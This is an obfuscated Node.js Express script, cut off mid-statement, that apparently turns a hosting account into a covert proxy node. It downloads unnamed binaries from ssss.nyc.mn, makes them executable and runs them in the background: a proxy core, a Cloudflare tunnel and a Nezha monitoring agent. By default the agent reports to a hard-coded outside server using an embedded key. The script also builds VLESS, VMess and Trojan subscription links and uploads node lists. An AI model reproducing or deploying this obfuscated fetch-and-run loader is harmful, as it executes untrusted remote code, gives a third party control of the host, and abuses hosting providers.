const _0x1bd688=_0x5f42;function _0x5f42(_0x112243,_0x4b780f){const _0x30e9fb=_0x30e9();return _0x5f42=function(_0x5f4272,_0x4f009c){_0x5f4272=_0x5f4272-0x111;let _0x326804=_0x30e9fb[_0x5f4272];return _0x326804;},_0x5f42(_0x112243,_0x4b780f);}(function(_0x711537,_0x32639d){const _0x340b32={_0x58aef8:0x145,_0x5984b7:0x1a3,_0x343731:0x12a,_0x3abd41:0x150,_0x511853:0x129,_0x55955b:0x1ab,_0x42fd4e:0x196,_0x559393:0x1ce},_0x45e7ea=_0x5f42,_0x1ae619=_0x711537();while(!![]){try{const _0xa88dd6=-parseInt(_0x45e7ea(_0x340b32._0x58aef8))/0x1*(-parseInt(_0x45e7ea(_0x340b32._0x5984b7))/0x2)+-parseInt(_0x45e7ea(0x14d))/0x3*(-parseInt(_0x45e7ea(0x118))/0x4)+parseInt(_0x45e7ea(_0x340b32._0x343731))/0x5*(parseInt(_0x45e7ea(0x14f))/0x6)+-parseInt(_0x45e7ea(_0x340b32._0x3abd41))/0x7*(-parseInt(_0x45e7ea(_0x340b32._0x511853))/0x8)+parseInt(_0x45e7ea(_0x340b32._0x55955b))/0x9*(parseInt(_0x45e7ea(0x141))/0xa)+parseInt(_0x45e7ea(_0x340b32._0x42fd4e))/0xb*(parseInt(_0x45e7ea(0x153))/0xc)+-parseInt(_0x45e7ea(_0x340b32._0x559393))/0xd*(parseInt(_0x45e7ea(0x1b3))/0xe);if(_0xa88dd6===_0x32639d)break;else _0x1ae619['push'](_0x1ae619['shift']());}catch(_0x58bcd8){_0x1ae619['push'](_0x1ae619['shift']());}}}(_0x30e9,0x45e87));const express=require(_0x1bd688(0x1a5)),app=express(),axios=require(_0x1bd688(0x18a)),os=require('os'),fs=require('fs'),path=require(_0x1bd688(0x1a4)),{promisify}=require('util'),exec=promisify(require(_0x1bd688(0x170))['exec']),UPLOAD_URL=process[_0x1bd688(0x19a)][_0x1bd688(0x137)]||'',PROJECT_URL=process['env'][_0x1bd688(0x171)]||'',AUTO_ACCESS=process[_0x1bd688(0x19a)][_0x1bd688(0x193)]||![],FILE_PATH=process['env'][_0x1bd688(0x126)]||'.tmp',SUB_PATH=process[_0x1bd688(0x19a)]['SUB_PATH']||'666666',PORT=process['env'][_0x1bd688(0x16a)]||process[_0x1bd688(0x19a)]['PORT']||0xbb8,UUID=process[_0x1bd688(0x19a)]['UUID']||_0x1bd688(0x197),NEZHA_SERVER=process[_0x1bd688(0x19a)][_0x1bd688(0x11c)]||'angent.ommani.ggff.net:80',NEZHA_PORT=process['env'][_0x1bd688(0x163)]||'',NEZHA_KEY=process[_0x1bd688(0x19a)][_0x1bd688(0x188)]||'lztUAxCoB6voRQGyoYN8FbvMxTL2B1cC',ARGO_DOMAIN=process[_0x1bd688(0x19a)][_0x1bd688(0x14e)]||_0x1bd688(0x194),ARGO_AUTH=process[_0x1bd688(0x19a)][_0x1bd688(0x115)]||'eyJhIjoiM2JkY2Y4YzE2NDMzYTI2M2Q2N2JjNTU0OGQ5MjZmNDYiLCJ0IjoiYzY5OTAwOWUtMDQ4OC00MWEwLWJhMzctOGRiMTc3MDViMDU0IiwicyI6IllXSTBaVFU1T1RFdFpEUTFNaTAwTURVMExUZzROamt0WVRsbFpUTmxNakZsWVdFeCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x1bd688(0x19a)][_0x1bd688(0x139)]||_0x1bd688(0x19c),CFPORT=process[_0x1bd688(0x19a)][_0x1bd688(0x198)]||0x1bb,NAME=process[_0x1bd688(0x19a)][_0x1bd688(0x1a6)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x1bd688(0x15a)](FILE_PATH),console[_0x1bd688(0x142)](FILE_PATH+'\x20is\x20created')):console[_0x1bd688(0x142)](FILE_PATH+_0x1bd688(0x1c8));function generateRandomName(){const _0x34c1cb={_0x2cfb3a:0x1a9,_0x4d8e48:0x16d},_0x4bd901=_0x1bd688,_0x5ac0cc=_0x4bd901(0x167);let _0x16ff29='';for(let _0x52e732=0x0;_0x52e732<0x6;_0x52e732++){_0x16ff29+=_0x5ac0cc[_0x4bd901(_0x34c1cb._0x2cfb3a)](Math[_0x4bd901(_0x34c1cb._0x4d8e48)](Math[_0x4bd901(0x169)]()*_0x5ac0cc[_0x4bd901(0x18e)]));}return _0x16ff29;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1bd688(0x12f)](FILE_PATH,phpName),webPath=path[_0x1bd688(0x12f)](FILE_PATH,webName),botPath=path[_0x1bd688(0x12f)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x1bd688(0x136)),listPath=path[_0x1bd688(0x12f)](FILE_PATH,_0x1bd688(0x11a)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x1bd688(0x12f)](FILE_PATH,_0x1bd688(0x187));function deleteNodes(){const _0x44376c={_0xd4a3ec:0x1c9,_0x308e7e:0x151,_0x342304:0x1b9,_0x132563:0x15e,_0xf68205:0x13c,_0x562f85:0x1a2},_0x4c175f=_0x1bd688;try{if(!UPLOAD_URL)return;if(!fs[_0x4c175f(_0x44376c._0xd4a3ec)](subPath))return;let _0x25d4fa;try{_0x25d4fa=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x5839a8=Buffer[_0x4c175f(0x176)](_0x25d4fa,_0x4c175f(_0x44376c._0x308e7e))[_0x4c175f(_0x44376c._0x342304)](_0x4c175f(0x130)),_0x295a4b=_0x5839a8[_0x4c175f(_0x44376c._0x132563)]('\x0a')['filter'](_0x1ac3b2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4c175f(0x11f)](_0x1ac3b2));if(_0x295a4b[_0x4c175f(0x18e)]===0x0)return;return axios[_0x4c175f(0x138)](UPLOAD_URL+_0x4c175f(_0x44376c._0xf68205),JSON['stringify']({'nodes':_0x295a4b}),{'headers':{'Content-Type':_0x4c175f(_0x44376c._0x562f85)}})[_0x4c175f(0x192)](_0x4ab47f=>{return null;}),null;}catch(_0x2b56ac){return null;}}function cleanupOldFiles(){const _0x4ee395=_0x1bd688;try{const _0x59781c=fs['readdirSync'](FILE_PATH);_0x59781c[_0x4ee395(0x1b1)](_0x9dbff9=>{const _0x354534=_0x4ee395,_0x937f9d=path['join'](FILE_PATH,_0x9dbff9);try{const _0x13c589=fs[_0x354534(0x1c1)](_0x937f9d);_0x13c589[_0x354534(0x149)]()&&fs[_0x354534(0x1b8)](_0x937f9d);}catch(_0x58ffaf){}});}catch(_0x1c9a18){}}async function generateConfig(){const _0x39e576={_0x592ff6:0x12c,_0x120f5d:0x16c,_0x1a9f4f:0x16c,_0x4d32fe:0x1ae,_0x2643b6:0x13b,_0x5c46b1:0x148,_0x527f8b:0x16c,_0x5519db:0x162,_0x151eec:0x117,_0x3ceb94:0x17c,_0x5a7ec6:0x157,_0x1309c1:0x168,_0xf4b53c:0x185,_0x37d14b:0x1b6},_0x364bd6=_0x1bd688,_0x48875d={'log':{'access':_0x364bd6(_0x39e576._0x592ff6),'error':_0x364bd6(_0x39e576._0x592ff6),'loglevel':_0x364bd6(_0x39e576._0x120f5d)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x364bd6(0x13e)}],'decryption':_0x364bd6(_0x39e576._0x1a9f4f),'fallbacks':[{'dest':0xbb9},{'path':_0x364bd6(0x162),'dest':0xbba},{'path':_0x364bd6(_0x39e576._0x4d32fe),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x364bd6(0x148),'settings':{'clients':[{'id':UUID}],'decryption':_0x364bd6(0x16c)},'streamSettings':{'network':_0x364bd6(_0x39e576._0x2643b6),'security':_0x364bd6(_0x39e576._0x120f5d)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x364bd6(_0x39e576._0x5c46b1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x364bd6(_0x39e576._0x527f8b)},'streamSettings':{'network':'ws','security':_0x364bd6(_0x39e576._0x527f8b),'wsSettings':{'path':_0x364bd6(_0x39e576._0x5519db)}},'sniffing':{'enabled':!![],'destOverride':[_0x364bd6(0x117),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x364bd6(0x157),'protocol':_0x364bd6(0x1bf),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x364bd6(0x1ae)}},'sniffing':{'enabled':!![],'destOverride':[_0x364bd6(_0x39e576._0x151eec),_0x364bd6(_0x39e576._0x3ceb94),_0x364bd6(0x1a1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x364bd6(_0x39e576._0x5a7ec6),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x364bd6(0x16c),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x364bd6(0x117),_0x364bd6(0x17c),_0x364bd6(0x1a1)],'metadataOnly':![]}}],'dns':{'servers':[_0x364bd6(0x13f)]},'outbounds':[{'protocol':_0x364bd6(0x1a7),'tag':_0x364bd6(_0x39e576._0x1309c1)},{'protocol':_0x364bd6(_0x39e576._0xf4b53c),'tag':_0x364bd6(0x14c)}]};fs[_0x364bd6(0x1b4)](path[_0x364bd6(0x12f)](FILE_PATH,_0x364bd6(0x187)),JSON[_0x364bd6(_0x39e576._0x37d14b)](_0x48875d,null,0x2));}function getSystemArchitecture(){const _0x4f6a08=_0x1bd688,_0x78e170=os[_0x4f6a08(0x1cc)]();return _0x78e170==='arm'||_0x78e170==='arm64'||_0x78e170==='aarch64'?_0x4f6a08(0x122):'amd';}function downloadFile(_0x5b10e0,_0x26d005,_0x3d113d){const _0x24ba81={_0x45fa8a:0x1cb,_0xdd4920:0x11b,_0xccc665:0x192},_0x56204c={_0x2a1201:0x14a,_0x31ecbf:0x155,_0x2bd2ac:0x184},_0x51acf9={_0x21955d:0x12d,_0x211dde:0x184},_0x279bff={_0x33ae76:0x140,_0x140083:0x1be,_0x2cb3fc:0x155,_0x2a760:0x184},_0x5c30c6=_0x1bd688,_0xd95759=_0x5b10e0;!fs[_0x5c30c6(0x1c9)](FILE_PATH)&&fs[_0x5c30c6(0x15a)](FILE_PATH,{'recursive':!![]});const _0x5abd99=fs['createWriteStream'](_0xd95759);axios({'method':_0x5c30c6(_0x24ba81._0x45fa8a),'url':_0x26d005,'responseType':_0x5c30c6(_0x24ba81._0xdd4920)})[_0x5c30c6(0x159)](_0x1922b5=>{const _0x107311={_0x511593:0x1bb,_0x486877:0x1be},_0x158893=_0x5c30c6;_0x1922b5[_0x158893(0x123)]['pipe'](_0x5abd99),_0x5abd99['on'](_0x158893(_0x51acf9._0x21955d),()=>{const _0x2f72c1=_0x158893;_0x5abd99[_0x2f72c1(_0x107311._0x511593)](),console[_0x2f72c1(0x142)](_0x2f72c1(_0x107311._0x486877)+path['basename'](_0xd95759)+_0x2f72c1(0x16b)),_0x3d113d(null,_0xd95759);}),_0x5abd99['on'](_0x158893(_0x51acf9._0x211dde),_0x3a1f03=>{const _0x6bcc03=_0x158893;fs[_0x6bcc03(_0x279bff._0x33ae76)](_0xd95759,()=>{});const _0x38a4aa=_0x6bcc03(_0x279bff._0x140083)+path['basename'](_0xd95759)+_0x6bcc03(0x14a)+_0x3a1f03[_0x6bcc03(_0x279bff._0x2cb3fc)];console[_0x6bcc03(_0x279bff._0x2a760)](_0x38a4aa),_0x3d113d(_0x38a4aa);});})[_0x5c30c6(_0x24ba81._0xccc665)](_0x11a41c=>{const _0x5f4ad7=_0x5c30c6,_0x59cb26=_0x5f4ad7(0x1be)+path['basename'](_0xd95759)+_0x5f4ad7(_0x56204c._0x2a1201)+_0x11a41c[_0x5f4ad7(_0x56204c._0x31ecbf)];console[_0x5f4ad7(_0x56204c._0x2bd2ac)](_0x59cb26),_0x3d113d(_0x59cb26);});}async function downloadFilesAndRun(){const _0x3fa1be={_0x1ac2ce:0x195,_0x4794fd:0x154,_0x11513a:0x186,_0x57b7f9:0x17f,_0x513b75:0x15e,_0x2445fc:0x164,_0x3ca4b4:0x174,_0x3ccada:0x180,_0x9059b6:0x15c,_0x24b248:0x12f,_0x36412d:0x191,_0x34106b:0x142,_0x20b982:0x1c7,_0x4d008c:0x17d,_0x342ad6:0x120,_0x5ee628:0x1b2,_0x49037a:0x1b7,_0x596a11:0x142,_0x25972c:0x144,_0x2761ea:0x184,_0x1f96ab:0x143,_0x30c730:0x142,_0x276e1d:0x18b,_0x2b413b:0x1c9,_0x562d07:0x1ac,_0x1c0bc6:0x1b7,_0xe6cb1a:0x147},_0x556fed={_0x3bc903:0x1b1},_0x25c233=_0x1bd688,_0x2324e9=getSystemArchitecture(),_0x246d59=getFilesForArchitecture(_0x2324e9);if(_0x246d59[_0x25c233(0x18e)]===0x0){console['log'](_0x25c233(0x18f));return;}const _0x96eb14=_0x246d59[_0x25c233(_0x3fa1be._0x1ac2ce)](_0x20ea41=>{return new Promise((_0x4174ce,_0x58ea1b)=>{downloadFile(_0x20ea41['fileName'],_0x20ea41['fileUrl'],(_0x3ec975,_0xe02d6f)=>{_0x3ec975?_0x58ea1b(_0x3ec975):_0x4174ce(_0xe02d6f);});});});try{await Promise[_0x25c233(_0x3fa1be._0x4794fd)](_0x96eb14);}catch(_0x4ce5b1){console[_0x25c233(0x184)](_0x25c233(_0x3fa1be._0x11513a),_0x4ce5b1);return;}function _0x5e6fb5(_0x1aca15){const _0x2de41b=_0x25c233,_0x241390=0x1fd;_0x1aca15[_0x2de41b(_0x556fed._0x3bc903)](_0x1f70c4=>{const _0x12a72b={_0x1af6a3:0x184},_0x22bbff=_0x2de41b;fs[_0x22bbff(0x1c9)](_0x1f70c4)&&fs[_0x22bbff(0x128)](_0x1f70c4,_0x241390,_0x9146ac=>{const _0x14edb4=_0x22bbff;_0x9146ac?console[_0x14edb4(_0x12a72b._0x1af6a3)]('Empowerment\x20failed\x20for\x20'+_0x1f70c4+':\x20'+_0x9146ac):console[_0x14edb4(0x142)]('Empowerment\x20success\x20for\x20'+_0x1f70c4+':\x20'+_0x241390[_0x14edb4(0x1b9)](0x8));});});}const _0x3877a9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5e6fb5(_0x3877a9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4e6111=NEZHA_SERVER[_0x25c233(_0x3fa1be._0x57b7f9)](':')?NEZHA_SERVER[_0x25c233(_0x3fa1be._0x513b75)](':')['pop']():'',_0x66119e=new Set(['443',_0x25c233(0x120),'2096','2087',_0x25c233(0x1b2),_0x25c233(_0x3fa1be._0x2445fc)]),_0x471256=_0x66119e[_0x25c233(_0x3fa1be._0x3ca4b4)](_0x4e6111)?_0x25c233(0x127):'false',_0x235666=_0x25c233(0x19e)+NEZHA_KEY+_0x25c233(_0x3fa1be._0x3ccada)+NEZHA_SERVER+_0x25c233(_0x3fa1be._0x9059b6)+_0x471256+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x25c233(0x1b4)](path[_0x25c233(_0x3fa1be._0x24b248)](FILE_PATH,_0x25c233(_0x3fa1be._0x36412d)),_0x235666);const _0x36be68=_0x25c233(0x1b7)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36be68),console[_0x25c233(_0x3fa1be._0x34106b)](phpName+'\x20is\x20running'),await new Promise(_0x363720=>setTimeout(_0x363720,0x3e8));}catch(_0x46eebe){console[_0x25c233(0x184)](_0x25c233(_0x3fa1be._0x20b982)+_0x46eebe);}}else{let _0x1c93e6='';const _0x3f7438=[_0x25c233(_0x3fa1be._0x4d008c),_0x25c233(_0x3fa1be._0x342ad6),_0x25c233(0x131),_0x25c233(0x182),_0x25c233(_0x3fa1be._0x5ee628),_0x25c233(0x164)];_0x3f7438[_0x25c233(0x17f)](NEZHA_PORT)&&(_0x1c93e6=_0x25c233(0x17e));const _0x58356e=_0x25c233(_0x3fa1be._0x49037a)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x25c233(0x18c)+NEZHA_KEY+'\x20'+_0x1c93e6+_0x25c233(0x165);try{await exec(_0x58356e),console[_0x25c233(_0x3fa1be._0x596a11)](npmName+_0x25c233(_0x3fa1be._0x25972c)),await new Promise(_0x560882=>setTimeout(_0x560882,0x3e8));}catch(_0x539d4c){console[_0x25c233(_0x3fa1be._0x2761ea)](_0x25c233(0x111)+_0x539d4c);}}}else console[_0x25c233(0x142)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3e0f47=_0x25c233(_0x3fa1be._0x49037a)+webPath+_0x25c233(0x156)+FILE_PATH+_0x25c233(_0x3fa1be._0x1f96ab);try{await exec(_0x3e0f47),console[_0x25c233(_0x3fa1be._0x30c730)](webName+'\x20is\x20running'),await new Promise(_0x3a1ab0=>setTimeout(_0x3a1ab0,0x3e8));}catch(_0xf40b11){console[_0x25c233(0x184)](_0x25c233(_0x3fa1be._0x276e1d)+_0xf40b11);}if(fs[_0x25c233(_0x3fa1be._0x2b413b)](botPath)){let _0x4e1003;if(ARGO_AUTH[_0x25c233(0x15f)](/^[A-Z0-9a-z=]{120,250}$/))_0x4e1003='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x25c233(0x15f)](/TunnelSecret/)?_0x4e1003=_0x25c233(0x133)+FILE_PATH+_0x25c233(0x1af):_0x4e1003=_0x25c233(_0x3fa1be._0x562d07)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x25c233(_0x3fa1be._0x1c0bc6)+botPath+'\x20'+_0x4e1003+_0x25c233(_0x3fa1be._0xe6cb1a)),console[_0x25c233(0x142)](botName+_0x25c233(_0x3fa1be._0x25972c)),await new Promise(_0x5b1582=>setTimeout(_0x5b1582,0x7d0));}catch(_0x5e2476){console['error'](_0x25c233(0x1b5)+_0x5e2476);}}await new Promise(_0x16924f=>setTimeout(_0x16924f,0x1388));}function getFilesForArchitecture(_0x3f58f6){const _0x4b19f2={_0x1da471:0x19f,_0xa9c224:0x1aa,_0x3495f3:0x122,_0x42f90d:0x132,_0x16c2b7:0x122,_0x318509:0x13d,_0x1c7b83:0x132},_0x4fb730=_0x1bd688;let _0xcf1bbe;_0x3f58f6==='arm'?_0xcf1bbe=[{'fileName':webPath,'fileUrl':_0x4fb730(_0x4b19f2._0x1da471)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0xcf1bbe=[{'fileName':webPath,'fileUrl':_0x4fb730(_0x4b19f2._0xa9c224)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1505ce=_0x3f58f6===_0x4fb730(_0x4b19f2._0x3495f3)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0xcf1bbe[_0x4fb730(_0x4b19f2._0x42f90d)]({'fileName':npmPath,'fileUrl':_0x1505ce});}else{const _0x3a2a59=_0x3f58f6===_0x4fb730(_0x4b19f2._0x16c2b7)?_0x4fb730(_0x4b19f2._0x318509):'https://amd64.ssss.nyc.mn/v1';_0xcf1bbe[_0x4fb730(_0x4b19f2._0x1c7b83)]({'fileName':phpPath,'fileUrl':_0x3a2a59});}}return _0xcf1bbe;}function argoType(){const _0x7d6378={_0x373f8d:0x142,_0x2be8d3:0x1b4,_0x25b8ae:0x179,_0x43ee94:0x12f,_0x4ed93e:0x17b,_0x53517f:0x142,_0x451ef2:0x112},_0x2a2251=_0x1bd688;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2a2251(_0x7d6378._0x373f8d)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x2a2251(_0x7d6378._0x2be8d3)](path[_0x2a2251(0x12f)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x24f4ab='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2a2251(0x15e)]('\x22')[0xb]+_0x2a2251(_0x7d6378._0x25b8ae)+path[_0x2a2251(_0x7d6378._0x43ee94)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2a2251(0x125)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x2a2251(_0x7d6378._0x4ed93e)),_0x24f4ab);}else console[_0x2a2251(_0x7d6378._0x53517f)](_0x2a2251(_0x7d6378._0x451ef2));}async function extractDomains(){const _0x4b72ac={_0x522874:0x142,_0x43fbb5:0x175,_0x46130c:0x114,_0x50551f:0x130,_0x27e3c4:0x15e,_0x481dae:0x1b1,_0x3901cb:0x18e,_0x582b63:0x1a0,_0x39eb95:0x12f,_0x11c788:0x184},_0x289895={_0x46ac39:0x16f,_0x27540c:0x1bd,_0x4c1757:0x123,_0x5ed2be:0x123,_0x3c4021:0x1c5,_0x1df6de:0x1c6,_0x5b448b:0x18d,_0x15223b:0x15d,_0x500c1a:0x183},_0x32a6e4={_0x531738:0x1b0,_0x53e391:0x161,_0x4b851d:0x134},_0x235926=_0x1bd688;let _0x458bec;if(ARGO_AUTH&&ARGO_DOMAIN)_0x458bec=ARGO_DOMAIN,console[_0x235926(_0x4b72ac._0x522874)](_0x235926(0x19b),_0x458bec),await _0x3d0537(_0x458bec);else try{const _0x36ef7a=fs[_0x235926(_0x4b72ac._0x43fbb5)](path['join'](FILE_PATH,_0x235926(_0x4b72ac._0x46130c)),_0x235926(_0x4b72ac._0x50551f)),_0x434535=_0x36ef7a[_0x235926(_0x4b72ac._0x27e3c4)]('\x0a'),_0xa52d84=[];_0x434535[_0x235926(_0x4b72ac._0x481dae)](_0x22a89b=>{const _0x5956fb=_0x235926,_0x1374ca=_0x22a89b[_0x5956fb(0x15f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1374ca){const _0xbbc83d=_0x1374ca[0x1];_0xa52d84[_0x5956fb(0x121)](_0xbbc83d);}});if(_0xa52d84[_0x235926(_0x4b72ac._0x3901cb)]>0x0)_0x458bec=_0xa52d84[0x0],console[_0x235926(0x142)](_0x235926(_0x4b72ac._0x582b63),_0x458bec),await _0x3d0537(_0x458bec);else{console['log'](_0x235926(0x124)),fs[_0x235926(0x1b8)](path[_0x235926(_0x4b72ac._0x39eb95)](FILE_PATH,_0x235926(_0x4b72ac._0x46130c)));async function _0x3a9f76(){const _0x54f674=_0x235926;try{process['platform']===_0x54f674(0x177)?await exec(_0x54f674(_0x32a6e4._0x531738)+botName+_0x54f674(_0x32a6e4._0x53e391)):await exec(_0x54f674(0x1cf)+botName['charAt'](0x0)+']'+botName[_0x54f674(_0x32a6e4._0x4b851d)](0x1)+_0x54f674(0x11e));}catch(_0x3214d2){}}_0x3a9f76(),await new Promise(_0x3051d0=>setTimeout(_0x3051d0,0xbb8));const _0x1e4acb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x235926(0x135)+ARGO_PORT;try{await exec(_0x235926(0x1b7)+botPath+'\x20'+_0x1e4acb+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x47a75e=>setTimeout(_0x47a75e,0xbb8)),await extractDomains();}catch(_0x35058b){console[_0x235926(_0x4b72ac._0x11c788)]('Error\x20executing\x20command:\x20'+_0x35058b);}}}catch(_0xf0d8f6){console[_0x235926(0x184)]('Error\x20reading\x20boot.log:',_0xf0d8f6);}async function _0x52d76b(){const _0xcba35f=_0x235926;try{const _0x38ae0c=await axios['get'](_0xcba35f(_0x289895._0x46ac39),{'headers':{'User-Agent':_0xcba35f(_0x289895._0x27540c),'timeout':0xbb8}});if(_0x38ae0c[_0xcba35f(0x123)]&&_0x38ae0c['data'][_0xcba35f(0x172)]&&_0x38ae0c[_0xcba35f(_0x289895._0x4c1757)]['isp'])return(_0x38ae0c[_0xcba35f(0x123)][_0xcba35f(0x172)]+'-'+_0x38ae0c[_0xcba35f(_0x289895._0x4c1757)][_0xcba35f(0x181)])[_0xcba35f(0x15d)](/\s+/g,'_');}catch(_0x374bfc){try{const _0x2e33f4=await axios['get'](_0xcba35f(0x1c2),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x2e33f4[_0xcba35f(_0x289895._0x5ed2be)]&&_0x2e33f4['data'][_0xcba35f(_0x289895._0x3c4021)]==='success'&&_0x2e33f4[_0xcba35f(0x123)][_0xcba35f(0x1c6)]&&_0x2e33f4[_0xcba35f(0x123)]['org'])return(_0x2e33f4[_0xcba35f(0x123)][_0xcba35f(_0x289895._0x1df6de)]+'-'+_0x2e33f4[_0xcba35f(0x123)][_0xcba35f(_0x289895._0x5b448b)])[_0xcba35f(_0x289895._0x15223b)](/\s+/g,'_');}catch(_0x3d7ff9){}}return _0xcba35f(_0x289895._0x500c1a);}async function _0x3d0537(_0x22287b){const _0x4abdee=await _0x52d76b(),_0x3c8956=NAME?NAME+'-'+_0x4abdee:_0x4abdee;return new Promise(_0xbf7a8e=>{const _0x489834={_0x597282:0x1bc,_0x48b12d:0x17c,_0x27d890:0x199,_0x15695d:0x1ba,_0x23bdfa:0x1cd,_0x2276bb:0x190,_0x547c21:0x158,_0x2ee116:0x1b6,_0x5173d8:0x1b9,_0x2f868b:0x151,_0x202447:0x142,_0x41198f:0x1b9,_0x753697:0x176,_0xce2c13:0x1c3};setTimeout(()=>{const _0x387abd={_0x1203a6:0x151},_0x26deee=_0x5f42,_0x5b6112={'v':'2','ps':''+_0x3c8956,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x26deee(0x15b),'net':'ws','type':_0x26deee(0x16c),'host':_0x22287b,'path':_0x26deee(_0x489834._0x597282),'tls':_0x26deee(_0x489834._0x48b12d),'sni':_0x22287b,'alpn':'','fp':_0x26deee(_0x489834._0x27d890)},_0x250832=_0x26deee(_0x489834._0x15695d)+UUID+'@'+CFIP+':'+CFPORT+_0x26deee(_0x489834._0x23bdfa)+_0x22287b+_0x26deee(_0x489834._0x2276bb)+_0x22287b+_0x26deee(0x146)+_0x3c8956+_0x26deee(_0x489834._0x547c21)+Buffer[_0x26deee(0x176)](JSON[_0x26deee(_0x489834._0x2ee116)](_0x5b6112))[_0x26deee(_0x489834._0x5173d8)](_0x26deee(_0x489834._0x2f868b))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x22287b+_0x26deee(_0x489834._0x2276bb)+_0x22287b+_0x26deee(0x16e)+_0x3c8956+'\x0a\x20\x20\x20\x20';console[_0x26deee(_0x489834._0x202447)](Buffer['from'](_0x250832)[_0x26deee(_0x489834._0x41198f)](_0x26deee(_0x489834._0x2f868b))),fs['writeFileSync'](subPath,Buffer[_0x26deee(_0x489834._0x753697)](_0x250832)[_0x26deee(0x1b9)](_0x26deee(_0x489834._0x2f868b))),console[_0x26deee(0x142)](FILE_PATH+_0x26deee(_0x489834._0xce2c13)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x54be02,_0x22fc0b)=>{const _0x284325=_0x26deee,_0x30198f=Buffer['from'](_0x250832)[_0x284325(0x1b9)](_0x284325(_0x387abd._0x1203a6));_0x22fc0b['set']('Content-Type','text/plain;\x20charset=utf-8'),_0x22fc0b['send'](_0x30198f);}),_0xbf7a8e(_0x250832);},0x7d0);});}}async function uploadNodes(){const _0x1e7462={_0x1e4368:0x13a,_0x486c76:0x1a2,_0x413a0f:0x142,_0x4b8037:0x15e,_0x39307b:0x1ad,_0x1b96fc:0x18e,_0x2d607f:0x17a,_0x3e53f9:0x1ca},_0x1e5a56=_0x1bd688;if(UPLOAD_URL&&PROJECT_URL){const _0x552a45=PROJECT_URL+'/'+SUB_PATH,_0x262ed3={'subscription':[_0x552a45]};try{const _0x1aca23=await axios[_0x1e5a56(0x138)](UPLOAD_URL+_0x1e5a56(_0x1e7462._0x1e4368),_0x262ed3,{'headers':{'Content-Type':_0x1e5a56(_0x1e7462._0x486c76)}});return _0x1aca23&&_0x1aca23['status']===0xc8?(console[_0x1e5a56(_0x1e7462._0x413a0f)](_0x1e5a56(0x116)),_0x1aca23):null;}catch(_0x4435a6){if(_0x4435a6[_0x1e5a56(0x152)]){if(_0x4435a6[_0x1e5a56(0x152)][_0x1e5a56(0x1c5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const 